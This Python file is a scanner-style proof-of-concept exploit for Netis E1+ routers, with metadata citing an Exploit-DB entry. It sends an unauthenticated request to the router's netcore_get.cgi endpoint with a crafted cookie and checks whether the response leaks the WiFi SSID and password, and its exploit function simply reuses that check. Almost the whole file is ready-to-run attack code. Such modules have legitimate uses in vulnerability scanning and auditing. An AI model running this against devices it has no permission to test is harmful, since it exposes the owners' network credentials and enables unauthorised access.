import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Netis E1+ V1.2.32533 - Unauthenticated WiFi Password Leak''',
        "description": '''A vulnerability in Netis allows remote unauthenticated users to disclose the WiFi password of the remote device.''',
        "severity": "medium",
        "references": [
            "https://www.exploit-db.com/exploits/48384"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["netis", "exposure"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """//netcore_get.cgi"""
        method = "GET"
        data = """"""
        headers = {'Cookie': 'homeFirstShow=yes'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""rp_ap_password""" in resp0.text and """rp_ap_ssid""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url